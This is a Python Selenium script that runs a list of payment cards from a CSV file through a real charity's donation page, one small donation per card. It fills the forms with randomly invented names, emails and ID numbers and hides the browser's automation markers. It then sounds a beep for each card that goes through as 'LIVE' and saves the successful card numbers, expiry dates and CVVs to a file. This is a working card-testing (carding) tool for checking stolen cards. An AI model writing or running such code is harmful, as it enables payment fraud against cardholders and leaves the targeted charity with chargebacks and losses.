from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options
import time
import csv
import random
import string
# import pandas as pd  # Removido para ejecutable

class WebBot:
    def __init__(self, browser_type="chrome", headless=False):
        self.driver = None
        self.browser_type = browser_type
        self.headless = headless
    
    def generate_random_data(self):
        nombres = ["Carlos", "Maria", "Juan", "Ana", "Luis", "Sofia", "Pedro", "Laura", "Diego", "Carmen"]
        apellidos = ["Garcia", "Rodriguez", "Martinez", "Lopez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Cruz", "Flores"]
        
        nombre = random.choice(nombres)
        apellido1 = random.choice(apellidos)
        apellido2 = random.choice(apellidos)
        
        # Email aleatorio
        dominios = ["gmail.com", "hotmail.com", "yahoo.com", "outlook.com"]
        email_user = nombre.lower() + str(random.randint(100, 999))
        email = f"{email_user}@{random.choice(dominios)}"
        
        # Teléfono aleatorio
        telefono = "3" + "".join([str(random.randint(0, 9)) for _ in range(9)])
        
        # Documento aleatorio
        documento = "".join([str(random.randint(0, 9)) for _ in range(10)])
        
        return {
            "nombre": f"{nombre} {apellido1} {apellido2}",
            "email": email,
            "telefono": telefono,
            "documento": documento
        }

    def start_browser(self):
        try:
            if self.browser_type == "chrome":
                options = Options()
                
                if self.headless:
                    options.add_argument("--headless")
                
                options.add_argument("--incognito")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-blink-features=AutomationControlled")
                options.add_experimental_option("excludeSwitches", ["enable-automation"])
                options.add_experimental_option('useAutomationExtension', False)
                options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                
                import sys
                import os
                
                if getattr(sys, 'frozen', False):
                    # Ejecutable PyInstaller
                    base_path = sys._MEIPASS
                    chromedriver_path = os.path.join(base_path, "chromedriver-win64", "chromedriver.exe")
                else:
                    # Desarrollo
                    chromedriver_path = "chromedriver-win64/chromedriver.exe"
                
                service = ChromeService(executable_path=chromedriver_path)
                self.driver = webdriver.Chrome(service=service, options=options)
                
                self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
                
            return True
        except Exception as e:
            print(f"Error iniciando {self.browser_type}: {e}")
            return False

    def close_browser(self):
        if self.driver:
            self.driver.quit()

    def navigate_to_page(self, url):
        try:
            self.driver.get(url)
            time.sleep(2)
            return True
        except Exception as e:
            print(f"Error navegando a {url}: {e}")
            return False

    def donar_una_vez(self, numero, mes, anio, cvv):
        try:
            print(f"[INFO] [{self.browser_type.upper()}] PASO 1: Abriendo pagina de donacion...")
            print(f"[CARD] Tarjeta: {numero[:4]}**** {mes}/{anio} CVV:{cvv}")
            
            if not self.navigate_to_page("https://caballerosdelavirgen.com.co/donacion/"):
                print(f"[ERROR] [{self.browser_type.upper()}] Error: No se pudo cargar la pagina")
                return False

            wait = WebDriverWait(self.driver, 20)

            print(f"[INFO] [{self.browser_type.upper()}] PASO 2: Clic en 'UNA VEZ'...")
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(translate(text(), 'UNAVEZ', 'unavez'), 'una vez')]"))).click()
            time.sleep(0.5)

            print(f"[INFO] [{self.browser_type.upper()}] PASO 3: Clic en '$20.000'...")
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), '$ 20.000')]"))).click()
            time.sleep(0.5)

            print(f"[INFO] [{self.browser_type.upper()}] PASO 4: Clic en boton azul...")
            boton_azul = wait.until(EC.presence_of_element_located((By.XPATH, "//button[@type='submit' and not(@disabled)]//*[contains(text(), '20.000')]")))
            self.driver.execute_script("arguments[0].click();", boton_azul)
            time.sleep(1)

            print(f"[INFO] [{self.browser_type.upper()}] PASO 5: Llenando formulario...")
            
            # Generar datos aleatorios
            datos = self.generate_random_data()
            print(f"[INFO] Datos generados: {datos['nombre']} | {datos['email']} | {datos['telefono']}")
            
            # Llenar nombre lentamente
            name_field = wait.until(EC.presence_of_element_located((By.NAME, "full_name")))
            for char in datos['nombre']:
                name_field.send_keys(char)
                time.sleep(0.1)
            
            time.sleep(0.5)
            
            # Llenar email lentamente y verificar si es válido
            max_intentos_email = 5
            for intento in range(max_intentos_email):
                email_field = self.driver.find_element(By.NAME, "email")
                email_field.clear()
                
                # Si no es el primer intento, generar un nuevo email
                if intento > 0:
                    datos = self.generate_random_data()
                    print(f"[INFO] Regenerando email, intento {intento+1}: {datos['email']}")
                
                # Escribir el email lentamente
                for char in datos['email']:
                    email_field.send_keys(char)
                    time.sleep(0.08)
                
                # Esperar un momento para ver si aparece mensaje de error
                time.sleep(1)
                
                # Verificar si hay mensaje de error de email
                try:
                    error_elements = self.driver.find_elements(By.XPATH, "//*[contains(text(), 'email') and (contains(text(), 'inválido') or contains(text(), 'invalido') or contains(text(), 'incorrecto'))]")
                    if not error_elements:
                        # No hay error, continuar
                        break
                    else:
                        print(f"[WARN] Email inválido detectado: {datos['email']}")
                        if intento == max_intentos_email - 1:
                            print(f"[ERROR] No se pudo generar un email válido después de {max_intentos_email} intentos")
                except Exception as e:
                    # Si hay error al buscar, asumimos que no hay problema
                    break
            
            time.sleep(0.5)
            
            # Llenar teléfono lentamente
            phone_field = self.driver.find_element(By.NAME, "phone")
            for char in datos['telefono']:
                phone_field.send_keys(char)
                time.sleep(0.12)
            
            # Seleccionar tipo de documento - usar valor exacto del debug
            try:
                document_select = Select(wait.until(EC.presence_of_element_located((By.NAME, "document_type"))))
                # Usar el valor exacto obtenido del debug: value='16' para 'Cédula de ciudadanía'
                document_select.select_by_value("16")
                print(f"[OK] [{self.browser_type.upper()}] Seleccionado: Cedula de ciudadania (value=16)")
            except Exception as e:
                print(f"[WARN] [{self.browser_type.upper()}] Error seleccionando documento: {e}")
            
            # Llenar documento lentamente
            time.sleep(0.5)
            document_field = self.driver.find_element(By.NAME, "document")
            for char in datos['documento']:
                document_field.send_keys(char)
                time.sleep(0.1)

            print(f"[INFO] [{self.browser_type.upper()}] PASO 6: Aceptar terminos...")
            try:
                # Usar el selector exacto obtenido del debug: name='terms_and_conditions', id='termsCheckbox'
                checkbox = wait.until(EC.element_to_be_clickable((By.ID, "termsCheckbox")))
                self.driver.execute_script("arguments[0].click();", checkbox)
                print(f"[OK] [{self.browser_type.upper()}] Checkbox de terminos clickeado")
            except Exception as e:
                print(f"[WARN] [{self.browser_type.upper()}] Error con checkbox: {e}")
            
            time.sleep(2)

            print(f"[INFO] [{self.browser_type.upper()}] PASO 7: Enviar para ir a pasarela...")
            boton_final = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[.//span[contains(text(), 'Una vez') and contains(text(), '20.000')]]")))
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", boton_final)
            self.driver.execute_script("arguments[0].click();", boton_final)
            time.sleep(3)

            print(f"[INFO] [{self.browser_type.upper()}] PASO 8: Ingresando a iframe de tarjeta...")
            iframe = wait.until(EC.presence_of_element_located((By.ID, "paylands-card-frame")))
            self.driver.switch_to.frame(iframe)

            print(f"[INFO] [{self.browser_type.upper()}] PASO 9: Llenando campos de tarjeta...")
            campo_pan = wait.until(EC.presence_of_element_located((By.NAME, "cardPan")))
            campo_exp = wait.until(EC.presence_of_element_located((By.NAME, "cardExpireFull")))
            campo_cvv = wait.until(EC.presence_of_element_located((By.NAME, "cvv2")))

            # Limpiar campos completamente
            self.driver.execute_script("arguments[0].value = '';", campo_pan)
            self.driver.execute_script("arguments[0].value = '';", campo_exp)
            self.driver.execute_script("arguments[0].value = '';", campo_cvv)
            time.sleep(0.5)

            # Llenar numero de tarjeta
            numero_limpio = numero.strip().replace(" ", "")
            for i in range(0, len(numero_limpio), 4):
                grupo = numero_limpio[i:i+4]
                campo_pan.send_keys(grupo)
                time.sleep(0.2)

            # Llenar fecha de expiracion
            fecha_exp = f"{mes.strip().zfill(2)}/{anio.strip()[-2:]}"
            for char in fecha_exp:
                campo_exp.send_keys(char)
                time.sleep(0.2)

            # Llenar CVV
            campo_cvv.send_keys(cvv.strip())
            time.sleep(0.5)
            print(f"[OK] [{self.browser_type.upper()}] Datos de tarjeta ingresados")

            self.driver.switch_to.default_content()

            print(f"[INFO] [{self.browser_type.upper()}] PASO 10: Confirmar donacion...")
            boton_xpath = "//button[@type='submit' and .//span[contains(text(), 'Una vez')]]"
            try:
                WebDriverWait(self.driver, 3).until(EC.invisibility_of_element_located((By.CSS_SELECTOR, "div[class*='loading'], div[class*='overlay'], .spinner")))
                print(f"[OK] [{self.browser_type.upper()}] Overlay desaparecio.")
            except:
                print(f"[WARN] [{self.browser_type.upper()}] No se detecto overlay.")

            boton_donar = wait.until(EC.visibility_of_element_located((By.XPATH, boton_xpath)))
            wait.until(lambda d: boton_donar.is_enabled())
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", boton_donar)
            self.driver.execute_script("arguments[0].click();", boton_donar)
            print(f"[OK] [{self.browser_type.upper()}] Boton de pago clickeado.")
            time.sleep(5)

            print(f"[INFO] [{self.browser_type.upper()}] PASO 11: Verificando resultado final...")

            try:
                # Esperar hasta 2 minutos por la respuesta final
                WebDriverWait(self.driver, 120).until(
                    EC.any_of(
                        EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'gracias') or contains(text(), 'Gracias')]")),
                        EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'exitosa') or contains(text(), 'Exitosa')]"))
                    )
                )
                print(f"[OK] [{self.browser_type.upper()}] Donacion completada (detectado mensaje de exito).")
                # Reproducir sonido para tarjeta LIVE
                try:
                    import winsound
                    winsound.Beep(1000, 500)  # Frecuencia 1000Hz por 500ms
                except:
                    pass
                return True
            except:
                # Si no encuentra mensaje de éxito, verificar si hay mensaje de error
                try:
                    error_elements = self.driver.find_elements(By.XPATH, "//*[contains(text(), 'error') or contains(text(), 'Error') or contains(text(), 'rechazada') or contains(text(), 'fallida')]")
                    if error_elements:
                        print(f"[ERROR] [{self.browser_type.upper()}] Transaccion rechazada o con error.")
                    else:
                        print(f"[ERROR] [{self.browser_type.upper()}] Timeout - No se detecto respuesta en 2 minutos.")
                except:
                    print(f"[ERROR] [{self.browser_type.upper()}] Error verificando resultado final.")
                return False

        except Exception as e:
            print(f"[ERROR] [{self.browser_type.upper()}] ERROR: {e}")
            print(f"[ERROR] [{self.browser_type.upper()}] URL ACTUAL: {self.driver.current_url if self.driver else 'N/A'}")
            
            try:
                if self.driver:
                    self.driver.save_screenshot(f"error_screenshot_{int(time.time())}.png")
                    print(f"[DEBUG] Screenshot guardado para debug")
            except:
                pass
            
            return False

def leer_tarjetas_csv(ruta):
    tarjetas = []
    with open(ruta) as csvfile:
        reader = csv.reader(csvfile, delimiter='|')
        for row in reader:
            if len(row) == 4:
                tarjetas.append(row)
    return tarjetas

if __name__ == "__main__":
    tarjetas = leer_tarjetas_csv("tarjetas.csv")
    bot = WebBot(browser_type="chrome", headless=False)
    tarjetas_exitosas = []
    
    print("[INFO] Iniciando bot en Chrome...")
    
    if bot.start_browser():
        for i, tarjeta in enumerate(tarjetas, 1):
            print(f"\n[CARD] Ejecutando tarjeta {i}/{len(tarjetas)}: {tarjeta}")
            success = bot.donar_una_vez(*tarjeta)
            if success:
                tarjetas_exitosas.append(tarjeta)
            print("[OK] Exito" if success else "[ERROR] Fallo")
            time.sleep(2)
        
        bot.close_browser()
    
    if tarjetas_exitosas:
        # Generar CSV en lugar de Excel
        with open("tarjetas_exitosas.csv", 'w', newline='') as f:
            writer = csv.writer(f, delimiter='|')
            writer.writerow(["Numero", "Mes", "Año", "CVV"])  # Header
            for tarjeta in tarjetas_exitosas:
                writer.writerow(tarjeta)
        print(f"\n[OK] Archivo 'tarjetas_exitosas.csv' generado con {len(tarjetas_exitosas)} tarjetas exitosas.")
    else:
        print("\n[WARN] No hubo tarjetas exitosas.")